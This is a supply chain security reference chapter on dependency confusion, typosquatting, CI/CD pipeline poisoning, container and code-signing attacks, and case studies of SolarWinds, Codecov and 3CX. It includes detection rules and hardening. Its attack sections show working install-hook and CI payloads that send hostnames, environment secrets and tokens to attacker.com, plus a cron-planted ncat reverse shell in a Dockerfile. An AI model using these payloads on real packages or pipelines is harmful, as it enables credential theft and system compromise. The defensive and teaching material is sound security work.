# Domain 19 — Supply Chain Security

> **Scope.** Software supply chain: dependency/namespace confusion, typosquatting, CI/CD injection. Case studies: SolarWinds SUNBURST, 3CX/X_TRADER, Kaseya VSA/REvil, Codecov, xz utils CVE-2024-3094. RepoJacking, git signature spoofing. SLSA framework, Sigstore/cosign/Fulcio/Rekor, SBOM (SPDX/CycloneDX), OSV/CVE correlation. Hardware supply chain: counterfeit ICs, PUFs, hardware Trojans, PCB implants, NSA ANT catalog, OpenTitan.

---

## 1. Software supply chain attacks

### 1.1 Dependency and namespace confusion

#### 1.1.1 Mechanism

Package managers resolve names against registries in a defined priority order. When an organization uses private/internal package names that are not claimed on the public registry, an attacker registers the same name publicly with a higher version number. The package manager's default resolution logic prefers the higher version from the public source, pulling and executing the attacker's code during install. Alex Birsan demonstrated this in February 2021 against Apple, Microsoft, PayPal, and others.

The attack surface differs per ecosystem:

| Ecosystem | Namespace Model | Confusion Risk | Mitigation Primitive |
|-----------|----------------|----------------|----------------------|
| npm | Scoped (`@org/pkg`) or unscoped | HIGH for unscoped names | Use scopes; registry-level config in `.npmrc` |
| PyPI | Flat namespace, no scoping | CRITICAL | `--index-url` pointing to private only; `--extra-index-url` is dangerous |
| NuGet | Flat namespace | HIGH | Package Source Mapping (NuGet 6.0+); ID prefix reservation |
| Maven | GroupId-based (`com.company.pkg`) | MODERATE | GroupId ownership via Sonatype Central validation |
| Go modules | Domain-based paths (`github.com/org/pkg`) | LOW | Domain ownership validates path; `GONOSUMCHECK` / `GOPRIVATE` |
| Cargo | Flat namespace | HIGH | No native scoping; crate name squatting is possible |
| RubyGems | Flat namespace | HIGH | Gem name reservation; Bundler `source` blocks |

#### 1.1.2 Enumeration — discovering internal package names

```bash
# Extract internal package names from package-lock.json / yarn.lock
grep -oP '"(@?[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)?)"' package-lock.json | sort -u

# Check if a name exists on public npm
npm view <package-name> --json 2>/dev/null || echo "NOT ON PUBLIC NPM"

# Check PyPI
curl -s -o /dev/null -w "%{http_code}" https://pypi.org/pypi/<package-name>/json

# Enumerate internal NuGet feeds from nuget.config
grep -i "add key=" nuget.config | grep -oP 'value="[^"]+"'

# Automated confusion scanning with confused (https://github.com/visma-prodsec/confused)
confused -l npm package-lock.json
confused -l pip requirements.txt
confused -l mvn pom.xml
```

#### 1.1.3 Exploitation — dependency confusion attack chain

**npm attack:**

```bash
# 1. Register the internal package name on public npm
npm init --scope=@public -y
# Set name to match target's internal package name (unscoped)
# Set version higher than internal (e.g., 99.0.0)

# 2. Add preinstall script to package.json for code execution
cat > package.json << 'EOF'
{
  "name": "target-internal-pkg",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "curl https://attacker.com/exfil?host=$(hostname)&user=$(whoami)&dir=$(pwd)"
  }
}
EOF

npm publish
```

**PyPI attack:**

```python
# setup.py with install-time execution
from setuptools import setup
from setuptools.command.install import install
import os, socket, subprocess

class PostInstall(install):
    def run(self):
        # Exfiltrate environment
        host = socket.gethostname()
        user = os.getenv("USER", "unknown")
        cwd = os.getcwd()
        subprocess.Popen(
            ["curl", f"https://attacker.com/exfil?h={host}&u={user}&d={cwd}"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        install.run(self)

setup(
    name="target-internal-pkg",
    version="99.0.0",
    cmdclass={"install": PostInstall},
)
```

**NuGet attack:**

```xml
<!-- .nuspec with install.ps1 execution -->
<package>
  <metadata>
    <id>TargetInternalPkg</id>
    <version>99.0.0</version>
  </metadata>
  <files>
    <file src="tools\init.ps1" target="tools" />
  </files>
</package>
```

```powershell
# tools/init.ps1 — executed on package install in Visual Studio
$h = $env:COMPUTERNAME
$u = $env:USERNAME
Invoke-WebRequest -Uri "https://attacker.com/exfil?h=$h&u=$u" -UseBasicParsing
```

#### 1.1.4 Detection

**Sigma rule — anomalous package manager network activity during build:**

```yaml
title: Package Manager Connecting to Unexpected External Registry
id: 7c3d8f2a-1e4b-4a9c-b5d7-2f8e6a0c3d1b
status: experimental
description: Detects package manager processes reaching out to public registries when only private registries should be used
logsource:
  category: network_connection
  product: linux
detection:
  selection_process:
    Image|endswith:
      - '/npm'
      - '/node'
      - '/pip'
      - '/pip3'
      - '/python'
      - '/python3'
      - '/dotnet'
      - '/nuget'
  selection_dest:
    DestinationHostname|contains:
      - 'registry.npmjs.org'
      - 'pypi.org'
      - 'files.pythonhosted.org'
      - 'api.nuget.org'
  filter_allowed:
    # Exclude known CI runners that legitimately access public registries
    Image|contains:
      - '/actions-runner/'
  condition: selection_process and selection_dest and not filter_allowed
level: high
tags:
  - attack.initial_access
  - attack.t1195.002
```

**KQL — Defender for Endpoint — dependency confusion indicator:**

```kql
DeviceNetworkEvents
| where InitiatingProcessFileName in ("npm", "node", "pip", "pip3", "python", "python3", "dotnet")
| where RemoteUrl has_any ("registry.npmjs.org", "pypi.org", "api.nuget.org")
| where Timestamp > ago(1h)
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemotePort
| sort by Timestamp desc
```

**SPL — Splunk — unexpected package install in CI:**

```spl
index=ci_logs sourcetype=build_log
| search (process_name="npm" OR process_name="pip" OR process_name="dotnet")
  AND (dest_host="registry.npmjs.org" OR dest_host="pypi.org" OR dest_host="api.nuget.org")
| stats count by host, process_name, dest_host, _time
| where count > 0
```

#### 1.1.5 Hardening

**npm — lock to private registry only:**

```ini
# .npmrc (project-level)
registry=https://private.registry.company.com/
@company-scope:registry=https://private.registry.company.com/
# Block fallback to public registry for unscoped packages
//registry.npmjs.org/:_authToken=NEVER_USE_THIS
```

**PyPI — prevent public fallback:**

```ini
# pip.conf or pip.ini
[global]
index-url = https://private.pypi.company.com/simple/
# Do NOT use --extra-index-url — it allows fallback to public
no-index = false
trusted-host = private.pypi.company.com
```

**NuGet — Package Source Mapping (NuGet 6.0+):**

```xml
<!-- nuget.config -->
<configuration>
  <packageSources>
    <add key="private" value="https://private.nuget.company.com/v3/index.json" />
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />
  </packageSources>
  <packageSourceMapping>
    <packageSource key="private">
      <package pattern="Company.*" />
      <package pattern="Internal.*" />
    </packageSource>
    <packageSource key="nuget.org">
      <package pattern="Newtonsoft.*" />
      <package pattern="Microsoft.*" />
      <!-- Explicit allowlist of public packages -->
    </packageSource>
  </packageSourceMapping>
</configuration>
```

**Go — isolate private modules:**

```bash
# Prevent private module paths from leaking to public checksum DB
export GOPRIVATE="github.com/company/*,go.company.internal/*"
export GONOSUMCHECK="github.com/company/*"
export GONOPROXY="github.com/company/*"
```

#### 1.1.6 Incident response — dependency confusion compromise

1. **Contain** — isolate affected build agents; revoke all CI/CD secrets (tokens, deploy keys, cloud credentials) that were accessible in the build environment.
2. **Identify** — parse lockfiles from the last known-good build vs. current; diff package versions and sources. Check `npm audit signatures` or equivalent for provenance anomalies.
3. **Assess blast radius** — every artifact built with the compromised dependency is potentially tainted. Enumerate all downstream deployments.
4. **Eradicate** — remove the malicious package from caches (`~/.npm/_cacache`, `~/.cache/pip`, NuGet global packages). Pin to private registry only.
5. **Recover** — rebuild all affected artifacts from clean source with locked dependencies. Rotate all secrets that were present in the build environment.
6. **Harden** — implement Package Source Mapping / scoped registries. Reserve internal names on public registries as defensive placeholders.

---

### 1.2 Typosquatting and package hijacking

#### 1.2.1 Mechanism

Typosquatting exploits human error: the attacker registers packages with names visually or typographically similar to popular packages. Variants include character transposition (`reqeusts`), character omission (`requsts`), character substitution (`reque5ts`), hyphen/underscore confusion (`python-dateutil` vs `python_dateutil`), and scope impersonation (`@angualr/core`).

Package hijacking is distinct: the attacker takes control of a legitimate package by compromising the maintainer's account (credential stuffing, phished 2FA), exploiting registry transfer mechanisms, or social-engineering maintainership transfer. The `ua-parser-js` (Oct 2021), `coa` (Nov 2021), and `rc` (Nov 2021) npm incidents were all maintainer account compromises.

#### 1.2.2 Enumeration — typosquat detection

```bash
# Generate typosquat candidates for a package name
# Using typofinder (https://github.com/TypoFinder)
python3 typofinder.py --domain requests --type all

# Check npm for typosquat variants
for name in reqeusts requets reqests requsts reequests; do
  npm view "$name" --json 2>/dev/null && echo "EXISTS: $name"
done

# PyPI typosquat scanning with pypi-scan
pip install pypi-scan
pypi-scan --package requests --top 50
```

#### 1.2.3 Malicious package payload techniques

**npm — preinstall/postinstall hooks:**

```json
{
  "name": "ev1l-package",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node exfil.js",
    "postinstall": "node persist.js",
    "install": "node stage2.js"
  }
}
```

**PyPI — setup.py code execution at install time:**

- `setup()` call in `setup.py` executes arbitrary Python during `pip install`
- `__init__.py` executes on first import
- `.pth` files in site-packages execute on interpreter startup (used by `colorama` typosquats)

**npm/PyPI — data exfiltration methods observed in the wild:**

| Method | Detail |
|--------|--------|
| DNS exfiltration | Encode stolen data in DNS query subdomains: `<base64-data>.attacker.com` |
| HTTP POST | Direct HTTPS POST of env vars, SSH keys, `.npmrc` tokens |
| Reverse shell | `bash -i >& /dev/tcp/attacker/4444 0>&1` in postinstall |
| File upload | Archive `~/.ssh/`, `~/.aws/`, `~/.gnupg/` and upload |
| Cryptocurrency miner | Drop and execute XMRig or equivalent |
| Staged payload | Initial package downloads and executes secondary payload from C2 |

#### 1.2.4 Detection

**Sigma rule — suspicious script execution from node_modules:**

```yaml
title: Suspicious Process Spawned During npm Install
id: a4e2c7b1-3f5d-4e8a-9b6c-1d7f0e2a4b3c
status: experimental
description: Detects shell commands spawned by npm install hooks that may indicate a malicious package
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|endswith:
      - '/node'
      - '/npm'
    ParentCommandLine|contains:
      - 'install'
      - 'postinstall'
      - 'preinstall'
  selection_child:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/curl'
      - '/wget'
      - '/python'
      - '/python3'
    CommandLine|contains:
      - 'curl '
      - 'wget '
      - '/dev/tcp/'
      - 'base64'
      - '.ssh/'
      - '.npmrc'
      - '.env'
  condition: selection_parent and selection_child
level: critical
tags:
  - attack.execution
  - attack.t1059
  - attack.initial_access
  - attack.t1195.002
```

**Static analysis tools for malicious packages:**

```bash
# socket.dev CLI — behavioral analysis of npm packages
npx socket report create package-lock.json --output report.json

# npm audit signatures — verify registry provenance
npm audit signatures

# pip-audit — known vulnerability scan
pip install pip-audit
pip-audit --require-hashes --strict

# Phylum CLI — behavioral analysis (sandboxed install)
phylum analyze -t npm package-lock.json
```

#### 1.2.5 Hardening

```bash
# npm — disable install scripts globally (nuclear option)
npm config set ignore-scripts true

# npm — selective script allow per package
# .npmrc
ignore-scripts=true
# Then manually run scripts for trusted packages:
npm rebuild <trusted-package>

# npm — enable package provenance verification (npm 9.5+)
npm config set verify-signatures true

# pip — require hash verification
pip install --require-hashes -r requirements.txt

# Generate hashed requirements
pip-compile --generate-hashes requirements.in > requirements.txt
```

---

### 1.3 CI/CD pipeline poisoning

#### 1.3.1 Mechanism

The CI/CD pipeline is a high-value target: it has access to source code, build secrets (API tokens, signing keys, deploy credentials), and produces the artifacts that ship to production. Attack vectors:

- **Poisoned pipeline execution (PPE):** attacker modifies the CI config file (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`) in a pull request or compromised branch. If the CI runs on PR events without restriction, the modified pipeline executes.
- **Direct PPE (D-PPE):** attacker has write access to the repo and modifies the pipeline config directly.
- **Indirect PPE (I-PPE):** attacker modifies a file consumed by the pipeline (a Makefile, a script referenced in the CI config, a shared action/orb) without changing the CI config itself.
- **Secret exfiltration:** inject steps that print/exfiltrate environment variables containing secrets.
- **Artifact tampering:** modify built artifacts after the build step but before signing/publishing.

#### 1.3.2 GitHub Actions attack vectors

**PR-triggered workflow secret theft:**

```yaml
# Malicious .github/workflows/pr-attack.yml
name: PR Build
on:
  pull_request_target:  # Runs in context of BASE repo — has secrets access
    types: [opened, synchronize]

jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out attacker's code
      - run: |
          # Exfiltrate all secrets via environment
          env | curl -X POST -d @- https://attacker.com/exfil
```

**Compromised third-party action (RepoJacking path):**

```yaml
# If owner renames GitHub account, old namespace is claimable
steps:
  - uses: old-owner/useful-action@v1  # Attacker registers old-owner, serves malicious code
```

**GitHub Actions — pinning to SHA vs tag:**

```yaml
# INSECURE — tag can be re-pointed to malicious commit
- uses: actions/checkout@v4

# SECURE — pinned to specific commit SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
```

#### 1.3.3 Jenkins attack vectors

```groovy
// Jenkinsfile — credential exfiltration via withCredentials
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                withCredentials([string(credentialsId: 'deploy-token', variable: 'TOKEN')]) {
                    // Attacker-injected step
                    sh "curl -d token=${TOKEN} https://attacker.com/exfil"
                }
            }
        }
    }
}
```

Vulnerable Jenkins configurations: anonymous read access to `/script` console, unauthenticated access to `//credentials/`, outdated plugins with RCE (CVE-2019-1003000 through CVE-2019-1003005 — Script Security sandbox bypass).

#### 1.3.4 GitLab CI attack vectors

```yaml
# .gitlab-ci.yml — exfiltrate CI/CD variables
stages:
  - build

build:
  stage: build
  script:
    - env | base64 | curl -X POST -d @- https://attacker.com/exfil
  # Protected variables only exposed to protected branches — but unprotected
  # variables are exposed to ALL pipelines including MR pipelines
```

#### 1.3.5 Detection

**Sigma rule — CI/CD config file modification:**

```yaml
title: CI/CD Configuration File Modified
id: 5b8e2d4f-9a1c-4e3b-8d7f-6c0a2e1b5d9f
status: experimental
description: Detects modification of CI/CD pipeline configuration files that could indicate pipeline poisoning
logsource:
  category: file_change
  product: github
detection:
  selection:
    TargetFilename|endswith:
      - '.github/workflows/*.yml'
      - '.github/workflows/*.yaml'
      - '.gitlab-ci.yml'
      - 'Jenkinsfile'
      - '.circleci/config.yml'
      - 'azure-pipelines.yml'
      - '.travis.yml'
  filter_trusted:
    Actor|contains:
      - 'dependabot'
      - 'renovate'
  condition: selection and not filter_trusted
level: medium
tags:
  - attack.defense_evasion
  - attack.t1195.002
```

**KQL — detect secret access anomalies in GitHub Actions:**

```kql
GitHubAuditLog_CL
| where action_s == "workflows.completed_workflow_run"
| where workflow_path_s has_any (".github/workflows")
| where actor_s !in ("dependabot[bot]", "github-actions[bot]")
| where event_s == "pull_request_target"
| project TimeGenerated, actor_s, workflow_path_s, repo_s, head_sha_s
| sort by TimeGenerated desc
```

**SPL — detect pipeline configuration changes:**

```spl
index=github sourcetype=github:audit
action="workflows.*" OR action="push"
| search file_path="*.github/workflows/*" OR file_path="*Jenkinsfile*" OR file_path="*.gitlab-ci.yml"
| stats count by actor, repo, file_path, _time
| sort -_time
```

#### 1.3.6 Hardening

**GitHub Actions:**

```yaml
# Restrict workflow permissions (least privilege)
permissions:
  contents: read
  # Only add write permissions where explicitly needed

# Use reusable workflows with pinned refs
jobs:
  build:
    uses: company/shared-workflows/.github/workflows/build.yml@sha256:abc123...

# Require approval for first-time contributors
# Repository Settings → Actions → General → Fork pull request workflows
#   ✓ Require approval for first-time contributors

# Environment protection rules for deployment secrets
# Settings → Environments → production
#   ✓ Required reviewers
#   ✓ Wait timer
#   ✓ Deployment branches: main only
```

**Jenkins hardening:**

```groovy
// Global security configuration
// Manage Jenkins → Configure Global Security
//   ✓ Enable CSRF Protection
//   ✓ Enable Agent → Controller Security
//   ✓ Disable CLI over Remoting
//   ✓ Disable JNLP agent protocols 1-3

// Restrict Groovy sandbox
// Manage Jenkins → In-process Script Approval
//   Review and approve only necessary script signatures

// Credential scoping — bind credentials to specific folders/pipelines
// Manage Jenkins → Credentials → (folder scope) → Add Credentials
```

**GitLab CI:**

```yaml
# Protect CI/CD variables
# Settings → CI/CD → Variables
#   ✓ Protected: Only exposed to protected branches/tags
#   ✓ Masked: Hidden in job logs

# Restrict pipeline triggers on merge requests
# .gitlab-ci.yml
workflow:
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
      when: never  # Prevent MR pipelines from accessing secrets
    - if: '$CI_COMMIT_BRANCH == "main"'
      when: always
```

#### 1.3.7 Incident response — CI/CD compromise

1. **Contain** — immediately revoke ALL secrets accessible from the CI/CD system (deploy tokens, cloud IAM keys, signing keys, registry tokens). Disable the compromised pipeline. Quarantine build runners.
2. **Scope** — audit pipeline execution logs for the compromise window. Identify every artifact built during that period and every environment those artifacts were deployed to.
3. **Analyze** — diff pipeline config files against last known-good commits. Check for added steps, modified script blocks, new action/orb references, changed checkout refs.
4. **Eradicate** — rebuild runners from clean images. Re-provision secrets with new values. Pin all action/orb/plugin references to verified SHAs.
5. **Recover** — rebuild and redeploy all artifacts from the compromise window using verified pipeline configs.
6. **Post-incident** — implement environment protection rules, required reviewers for workflow changes, and CODEOWNERS enforcement for CI config files.

---

### 1.4 Container supply chain attacks

#### 1.4.1 Mechanism

Container images compose layers from base images, package installs, and application code. Each layer is an attack surface:

- **Base image poisoning:** compromised or backdoored base images on public registries (Docker Hub, Quay, GHCR). An attacker pushes a malicious image with a popular name/tag, or compromises a legitimate image's build pipeline.
- **Registry compromise:** attacking the registry itself (API vulnerabilities, credential theft) to replace legitimate image layers with malicious ones.
- **Dockerfile injection:** injecting commands into the build process via build args, multi-stage build leaks, or compromised build context files.
- **Tag mutability:** tags like `latest`, `stable`, or even version tags (e.g., `python:3.11`) can be re-pushed with different content. Without digest pinning, pulls get whatever the tag currently points to.

#### 1.4.2 Exploitation

**Malicious base image — embedded reverse shell:**

```dockerfile
# Attacker's Dockerfile for a popular-looking base image
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y ncat
RUN echo '#!/bin/bash\nncat -e /bin/bash attacker.com 4444 &' > /usr/local/bin/health-check \
    && chmod +x /usr/local/bin/health-check
# Add to cron or entrypoint
RUN echo "* * * * * /usr/local/bin/health-check" | crontab -
# Appears legitimate
CMD ["/bin/bash"]
```

**Build argument leakage:**

```dockerfile
# INSECURE — secret persists in image layer metadata
ARG DB_PASSWORD
RUN echo "DB_PASSWORD=${DB_PASSWORD}" >> /app/.env

# docker history shows the ARG value in the layer
# docker history --no-trunc <image> | grep DB_PASSWORD
```

#### 1.4.3 Detection

```bash
# Scan image for vulnerabilities and misconfigurations
trivy image --severity CRITICAL,HIGH --vuln-type os,library myapp:latest

# Verify image signature
cosign verify --key cosign.pub myregistry.com/myapp:latest

# Check for leaked secrets in image layers
docker history --no-trunc myapp:latest | grep -iE "(password|secret|token|key)"

# Scan with Grype
grype myregistry.com/myapp:latest --only-fixed --fail-on critical

# Detect suspicious binaries in container image
trivy image --scanners vuln,misconfig,secret myapp:latest
```

**Sigma rule — container image pull from untrusted registry:**

```yaml
title: Container Image Pulled from Untrusted Registry
id: 8d2f4e7a-5c1b-4d3e-a9f6-0b8c7e2d1a4f
status: experimental
description: Detects container runtime pulling images from registries not in the approved list
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith:
      - '/docker'
      - '/podman'
      - '/crictl'
      - '/ctr'
    CommandLine|contains: 'pull'
  filter_approved:
    CommandLine|contains:
      - 'company.azurecr.io'
      - 'gcr.io/company-project'
      - 'company.jfrog.io'
  condition: selection and not filter_approved
level: high
tags:
  - attack.initial_access
  - attack.t1195.002
```

#### 1.4.4 Hardening

```yaml
# Kubernetes admission policy — image digest enforcement (OPA/Gatekeeper)
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRepos
metadata:
  name: require-trusted-registries
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
  parameters:
    repos:
      - "company.azurecr.io/"
      - "gcr.io/company-project/"
```

```dockerfile
# Pin base images by digest, not tag
FROM python:3.11-slim@sha256:a1b2c3d4e5f6...

# Use multi-stage builds to minimize final image attack surface
FROM golang:1.22@sha256:... AS builder
WORKDIR /app
COPY . .
RUN CGO_ENABLED=0 go build -o /app/server

FROM gcr.io/distroless/static-debian12@sha256:...
COPY --from=builder /app/server /server
ENTRYPOINT ["/server"]
```

```bash
# Docker Content Trust — enforce signature verification
export DOCKER_CONTENT_TRUST=1
export DOCKER_CONTENT_TRUST_SERVER=https://notary.company.com

# Sign images with cosign
cosign sign --key cosign.key myregistry.com/myapp@sha256:abc123...

# Verify before pull in CI
cosign verify --key cosign.pub myregistry.com/myapp@sha256:abc123...
```

---

### 1.5 Code signing attacks

#### 1.5.1 Mechanism

Code signing provides integrity and authenticity guarantees: the signature proves the artifact was produced by the claimed publisher and has not been modified. Attacks against signing include:

- **Signing key theft:** extracting private keys from build servers, HSMs with weak access controls, or developer workstations. The SolarWinds attackers signed their backdoored DLL with SolarWinds' legitimate code-signing certificate.
- **Timestamp server abuse:** code signing timestamps prove the signature was created before the certificate expired. An attacker with a stolen but expired certificate can backdate signatures using compliant timestamp servers, or operate a rogue timestamp server.
- **Authenticode bypass (Windows):** catalog signing vs. embedded signing differences; unsigned DLLs loaded via search-order hijacking bypass signature checks; SIP (Subject Interface Package) manipulation to alter signature verification logic.
- **Certificate authority compromise:** compromising a CA to issue fraudulent code-signing certificates (e.g., DigiNotar 2011, Mimecast 2021).

#### 1.5.2 Exploitation

**Authenticode signature verification bypass with catalog manipulation:**

```powershell
# Check if a file has an embedded signature
Get-AuthenticodeSignature C:\Windows\System32\target.dll

# SIP DLL hijacking — HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\
# CryptSIPDllVerifyIndirectData\{SIP-GUID}
# Replacing the verification DLL with an attacker-controlled one causes all
# signature checks for that SIP type to return "valid"

# List registered SIP providers
reg query "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData"
```

**Unsigned DLL sideloading (bypasses signing enforcement on the host EXE):**

```
# Legitimate signed EXE loads attacker DLL from same directory
# The EXE's signature is valid; the DLL is not checked
copy legitimate_signed.exe C:\staging\
copy malicious.dll C:\staging\dependency.dll
C:\staging\legitimate_signed.exe   # Loads malicious dependency.dll
```

#### 1.5.3 Detection

```yaml
# Sigma rule — unsigned DLL loaded by signed process
title: Unsigned DLL Loaded by Signed Process
id: 6a9b3c1d-4e7f-5a2b-8c0d-3f1e9b5a7c2d
status: experimental
description: Detects a signed executable loading an unsigned or invalidly signed DLL
logsource:
  product: windows
  category: image_load
  # Requires Sysmon Event ID 7 with signature validation
detection:
  selection:
    Signed: 'false'
    ImageLoaded|endswith:
      - '.dll'
  filter_system:
    ImageLoaded|startswith:
      - 'C:\Windows\System32\'
      - 'C:\Windows\SysWOW64\'
  condition: selection and not filter_system
level: medium
tags:
  - attack.defense_evasion
  - attack.t1553.002
```

**KQL — unsigned module loads:**

```kql
DeviceImageLoadEvents
| where InitiatingProcessSignatureStatus == "Valid"
| where SignatureStatus != "Valid"
| where FileName endswith ".dll"
| where not(FolderPath startswith "C:\\Windows\\System32")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, FolderPath, SignatureStatus
| sort by Timestamp desc
```

#### 1.5.4 Hardening

```powershell
# Windows Defender Application Control (WDAC) — enforce signed binaries only
# Create policy from reference machine
New-CIPolicy -Level Publisher -FilePath "C:\policies\BasePolicy.xml" -UserPEs

# Convert to binary format
ConvertFrom-CIPolicy "C:\policies\BasePolicy.xml" "C:\policies\BasePolicy.p7b"

# Deploy via GPO:
# Computer Configuration → Administrative Templates → System → Device Guard
#   → Deploy Windows Defender Application Control
#   Path: C:\Windows\System32\CodeIntegrity\SIPolicy.p7b

# Require EV code signing for kernel drivers (Windows 10+)
# This is enforced by default on UEFI Secure Boot systems
```

```bash
# Linux — enforce signed kernel modules
# /etc/modprobe.d/signed-modules.conf
# Kernel parameter: module.sig_enforce=1

# Verify RPM package signatures
rpm -K --nosignature package.rpm

# Verify APT package signatures
apt-key list
apt-get install --allow-unauthenticated   # NEVER DO THIS
```

---

### 1.6 Major incidents — detailed analysis

#### 1.6.1 SolarWinds SUNBURST (2020)

**Attack chain:**

1. **Initial access:** attackers (attributed to SVR / APT29 / Cozy Bear) gained access to SolarWinds' build environment (exact initial vector undisclosed; possibly credential theft or VPN vulnerability).
2. **SUNSPOT build injection:** the attackers deployed SUNSPOT, a malware that monitored SolarWinds' build server for the Orion build process (`MsBuild.exe`). When detected, SUNSPOT replaced source file `InventoryManager.cs` with a backdoored version containing the SUNBURST implant — during the compilation process, before the compiler read the file. After compilation, SUNSPOT restored the original file.
3. **SUNBURST implant:** injected into `SolarWinds.Orion.Core.BusinessLayer.dll`. The implant:
   - Dormancy period of ~12-14 days after installation before activating
   - Environment fingerprinting: checked hostname, domain, running processes, security tools (avoided execution if security tools detected)
   - DNS-based C2: encoded victim identity into subdomain queries to `avsvmcloud[.]com` (DGA-generated subdomains)
   - C2 response via DNS CNAME records directing to second-stage C2 over HTTPS
   - Masqueraded HTTP traffic as legitimate Orion Improvement Program telemetry
4. **TEARDROP loader:** second-stage in-memory-only dropper, loaded Cobalt Strike Beacon. Never written to disk. Custom loader, not based on public tools.
5. **RAINDROP loader:** similar to TEARDROP but with different obfuscation (modified LZMA decompression). Used in lateral movement scenarios, not deployed directly by SUNBURST. Deployed as a DLL side-loaded by legitimate applications.
6. **Post-exploitation:** Cobalt Strike Beacon for interactive operations. AD compromise (DCSync, Golden Ticket / Golden SAML). Targeted approximately 100 organizations out of ~18,000 that received the backdoored update.

**CVE:** The backdoored Orion updates do not have a dedicated CVE. Associated vulnerability: CVE-2020-10148 (SolarWinds Orion API authentication bypass, used separately). The supply chain compromise itself is tracked as MITRE ATT&CK Software S0559 (SUNBURST).

**Key IOCs:**

| IOC Type | Value |
|----------|-------|
| C2 domain | `avsvmcloud[.]com` |
| Backdoored DLL hash (SHA-256) | `32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77` |
| SUNBURST DNS pattern | `<encoded-victim-id>.appsync-api.*.avsvmcloud[.]com` |
| TEARDROP DLL name | `netsetupsvc.dll` (varied) |
| RAINDROP DLL name | Varied; side-loaded via legitimate apps |
| Named pipe (Cobalt Strike) | `\\.\pipe\atsvc` (varied) |

**Detection — SUNBURST DNS query pattern:**

```yaml
title: SolarWinds SUNBURST DNS C2 Communication
id: c4e5d8f2-7a3b-4c1e-9d6f-2b8a5e0c4d7f
status: stable
description: Detects DNS queries matching SUNBURST DGA subdomain pattern to avsvmcloud.com
logsource:
  category: dns
detection:
  selection:
    query|endswith: '.avsvmcloud.com'
  condition: selection
level: critical
tags:
  - attack.command_and_control
  - attack.t1071.004
```

```kql
DnsEvents
| where Name endswith ".avsvmcloud.com"
| project TimeGenerated, Computer, Name, QueryType
| sort by TimeGenerated desc
```

#### 1.6.2 Codecov breach (2021, Jan-Apr)

**Attack chain:**

1. **Initial compromise:** attacker exploited a flaw in Codecov's Docker image creation process to extract a credential (GCS HMAC key) that granted write access to the Codecov Bash Uploader script hosted on `codecov.io`.
2. **Bash uploader modification:** the attacker appended a single line to the uploader script:

```bash
# Malicious line appended to codecov-bash-uploader
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://ATTACKER_IP/upload/v2 || true
```

3. **Impact:** every CI/CD pipeline that used `curl -s https://codecov.io/bash | bash` (the recommended installation method) executed the modified script, exfiltrating all environment variables — including CI tokens, AWS keys, GitHub tokens, and other secrets — to the attacker's server.
4. **Duration:** January 31 to April 1, 2021 (~2 months undetected).
5. **Downstream impact:** Twitch, HashiCorp, Confluent, and other companies confirmed exposure. HashiCorp rotated their GPG signing key as a precaution.

**Detection:**

```spl
index=proxy sourcetype=squid OR sourcetype=bluecoat
| search dest_ip="KNOWN_ATTACKER_IP"
| stats count by src_ip, dest_ip, uri_path, _time
```

```yaml
title: Codecov Bash Uploader Exfiltration
id: 9e1a3b5c-2d4f-6e7a-8b0c-1d3e5f7a9b2c
status: stable
description: Detects CI environment variable exfiltration matching Codecov breach pattern
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    ParentCommandLine|contains: 'codecov'
    Image|endswith: '/curl'
    CommandLine|contains:
      - 'git remote'
      - 'ENV'
      - 'env'
  condition: selection
level: critical
tags:
  - attack.exfiltration
  - attack.t1041
```

**Lessons:**
- `curl | bash` is inherently dangerous — it provides no integrity verification
- CI secrets should be scoped and short-lived (federated identity, not long-lived tokens)
- Monitor outbound connections from CI runners to unexpected destinations

#### 1.6.3 3CX supply chain attack (2023, CVE-2023-29059)

**Attack chain — cascading supply chain compromise:**

1. **Stage 0 — X_TRADER compromise:** attackers (Lazarus Group / DPRK) first compromised Trading Technologies' X_TRADER application. A 3CX employee installed the trojanized X_TRADER on a personal machine.
2. **Stage 1 — credential theft:** the X_TRADER malware (`VEILEDSIGNAL`) stole credentials from the employee's machine, which the attackers used to access 3CX's corporate network and eventually the build environment.
3. **Stage 2 — 3CX Desktop App trojanization:** the attackers injected malicious code into the 3CX Desktop App build:
   - Windows: legitimate `3CXDesktopApp.exe` loads `ffmpeg.dll` (DLL sideloading). The modified `ffmpeg.dll` reads encrypted payload from `d3dcompiler_47.dll` (appended to the legitimate Microsoft DLL, preserving its valid Authenticode signature). Payload decrypts and executes shellcode in memory.
   - macOS: `libffmpeg.dylib` modification with similar loader chain.
4. **Stage 3 — C2 and info-stealing:** the shellcode downloads icon files from a GitHub repository (`IconStorages`), parses embedded C2 URLs from the icon data, contacts C2, and deploys an info-stealer targeting browser data.

**Key IOCs:**

| Indicator | Value |
|-----------|-------|
| CVE | CVE-2023-29059 |
| Malicious `ffmpeg.dll` SHA-256 | `7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896` |
| Malicious `d3dcompiler_47.dll` SHA-256 | `11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03` |
| GitHub C2 repo | `IconStorages` (taken down) |
